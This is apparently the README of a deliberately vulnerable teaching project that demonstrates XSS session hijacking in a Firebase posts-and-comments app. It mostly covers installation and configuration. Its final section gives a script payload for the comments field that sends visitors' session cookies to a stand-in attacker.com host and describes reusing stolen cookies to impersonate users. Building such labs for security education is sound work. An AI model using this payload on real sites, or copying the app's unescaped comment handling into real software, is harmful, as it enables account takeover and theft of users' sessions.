# XSS Session Hijacking Attack
This project demonstrates session hijacking attacks using Cross-Site Scripting (XSS). The application uses Firebase for authentication and Firestore for data storage.

## Prerequisites
Node.js and npm installed on your system.
Firebase project setup with Firestore and Authentication enabled.
## Installation
1. Clone the repository:
```
git clone https://github.com/your-repo/xss-session-hijacking-attack.git](https://github.com/himIbraa/Session-Hijacking-Attack-through-XSS-Vulnerabilities
```
2. Navigate to the project directory:
```
cd xss-session-hijacking-attack
```
3. Install the dependencies:
```
npm install
```
## Firebase Configuration

1. Create a Firebase project at Firebase Console.

2. Enable Firestore and Authentication in your Firebase project.

3. Copy your Firebase project's configuration and replace the configuration in firebase-config.js with your own:
```
const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_AUTH_DOMAIN",
  databaseURL: "YOUR_DATABASE_URL",
  projectId: "YOUR_PROJECT_ID",
  storageBucket: "YOUR_STORAGE_BUCKET",
  messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
  appId: "YOUR_APP_ID",
  measurementId: "YOUR_MEASUREMENT_ID",
};
firebase.initializeApp(firebaseConfig);

const db = firebase.firestore();
const auth = firebase.auth();
```
## Running the Project
1. Start the server:
```
npm start
```
2. Open your browser and navigate to http://localhost:8080.
## Project Usage
1. Login and Signup: Users can sign up and log in to the application through the login.html page.
2. Add Posts: Logged-in users can add posts on the main feed page (index.html).
3. View Posts: All posts are displayed on the allPosts.html page.
4. Comments: Users can add comments to posts, which are displayed on the comments.html page.
## Dependencies
- Firebase: Used for authentication and Firestore database.
- http-server: A simple, zero-configuration command-line HTTP server.
## XSS Vulnerability
This project is intentionally vulnerable to Cross-Site Scripting (XSS) session hijacking attacks. An attacker can inject malicious scripts into the comments section, which can steal session cookies and hijack user sessions.

### How to Perform the Attack
1. Post a Malicious Comment: An attacker can post a comment containing a script to steal cookies. For example:
```
<script>
  document.write('<img src="http://attacker.com/steal?cookie=' + document.cookie + '" />');
</script>
```
2. View the Malicious Comment: When another user views the post with the malicious comment, their session cookie is sent to the attacker's server.

3. Hijack the Session: The attacker can use the stolen cookie to impersonate the user and hijack their session.


To run the project using npm, ensure you have followed the installation steps and configured Firebase correctly. Use the npm start command to launch the server and navigate to http://localhost:8080 in your browser to access the application.
